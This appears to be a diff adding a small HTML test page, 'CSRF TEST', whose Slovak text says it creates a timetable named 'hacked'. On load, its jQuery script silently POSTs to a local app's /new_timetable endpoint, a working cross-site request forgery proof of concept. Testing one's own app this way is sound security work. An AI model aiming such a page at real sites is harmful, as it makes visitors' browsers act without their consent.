@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF TEST</title>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+</head>
+<body>
+Tento skript spustil AJAX funkciu, kt. chce vytvorit novy rozvrh s nazvom "hacked".
+    <script>
+        $.ajax({
+            type:"POST",
+            url: "http://127.0.0.1:5000/new_timetable",
+            data:"hacked"
+        });
+    </script>
+</body>
+</html>
